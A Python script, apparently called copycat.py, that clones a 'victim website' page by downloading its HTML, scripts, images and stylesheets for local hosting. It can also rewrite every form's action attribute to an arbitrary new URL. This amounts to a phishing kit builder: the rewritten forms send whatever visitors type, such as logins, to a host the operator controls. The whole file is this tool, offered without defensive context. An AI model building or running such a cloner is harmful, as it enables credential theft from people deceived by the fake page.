#!/usr/bin/env python
# -*- coding: utf-8 -*-

from bs4 import BeautifulSoup
from PIL import Image
from io import BytesIO
import sys
import requests
import os
import argparse

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


parser = argparse.ArgumentParser(description='Copy client side files from another website',
                                 epilog='copycat.py "https://github.com" "/jambon69/copycat" -u "test.com"')

parser.add_argument('baseurl', type=str,
                    help='base URL of the victim website')
parser.add_argument('endpoint', type=str,
                    help='endpoint of the victim page')
parser.add_argument("-u", "--url", type=str,
                    help="new url for form actions")

args = parser.parse_args()

baseURL = args.baseurl
extURL = args.endpoint


# Start creating directory architecture
try:
    if len(extURL) > 1 and extURL[0] == '/':
        os.makedirs(os.path.dirname(extURL[1:]))
except OSError as e:
    pass


# Get local files
def fetchLocalFile(fileName):
    # We create the directory if he doesn't exist
    try:
        os.makedirs(os.path.dirname(fileName))
    except OSError as e:
        # Directory already exist
        pass

    # Don't take the req parameters into account
    req = requests.get(baseURL + '/' + fileName)
    logRequest(req, baseURL + '/' + fileName)

    if req.status_code == 404:
        pass
    elif "image" in req.headers['Content-Type']:
        img = Image.open(BytesIO(req.content))
        img.save(fileName)
    else:
        newFile = open(fileName.split('?')[0], 'w+')
        newFile.write(str(req.text.encode('utf-8')))
        newFile.close()


# get Full path of local file
def getFullPath(fullName):
    # toto/../tutu or toto/./tutu
    if len(fullName) == 0:
        return fullName
    if fullName[0] != '/':
        return os.path.normpath(os.path.dirname(extURL) + '/' + fullName)
    return fullName


# Gets all the files
def fetchFiles(filesName):
    for filename in filesName:
        # We only need local files
        if (filename[0:2] != '//' and filename[0] == '/') or filename[0:3] == '../' or filename[0:2] == './':
            # We erase the first '/'
            fetchLocalFile(getFullPath(filename)[1:])


# Basic logging with colors cause it's so fancy \o/
def logRequest(req, filename):
    color = bcolors.OKBLUE
    if req.status_code == 404:
        color = bcolors.FAIL
    elif req.status_code == 403:
        color = bcolors.WARNING

    print("[" + color + str(req.status_code) + bcolors.ENDC + "]" + " -- " + filename)


def basicLog(msg, color):
    if len(msg) % 2 != 0:
        msg = "-" + msg
    print(color + "-" * int((50-len(msg)) / 2) + msg + "-" * int((50-len(msg)) / 2) + bcolors.ENDC)


def change_form_action(url, soup):
    for form in soup.find_all("form"):
        form['action'] = url


def main():
    basicLog("Gathering index file", bcolors.OKGREEN)
    req = requests.get(baseURL + extURL)
    logRequest(req, baseURL + extURL)

    soup = BeautifulSoup(req.text, 'html.parser')

    # Let's gather all scripts
    basicLog("Gathering scripts", bcolors.OKGREEN)
    scripts = []
    for script in soup.find_all('script'):
        try:
            if len(script['src']) > 0:
                scripts.append(script['src'])
        except:
            pass
    fetchFiles(scripts)

    # Let's get images now !
    basicLog("Gathering images", bcolors.OKGREEN)
    images = []
    for image in soup.find_all('img'):
        try:
            if len(image['src']) > 0:
                images.append(image['src'])
        except:
            pass
    fetchFiles(images)

    # Let's get all the links \o/
    basicLog("Gathering links", bcolors.OKGREEN)
    links = []
    for link in soup.find_all('link'):
        try:
            if len(link['href']) > 0:
                links.append(link['href'])
        except:
            pass
    fetchFiles(links)

    filename = getFullPath(extURL)
    if len(os.path.basename(extURL)) > 0:
        newFile = open(filename[1:], 'w+')
    else:
        newFile = open('index.html', 'w+')

    # Change all form actions endpoint
    if (args.url):
        change_form_action(args.url, soup)

    newFile.write(str(soup))
    newFile.close()

main()
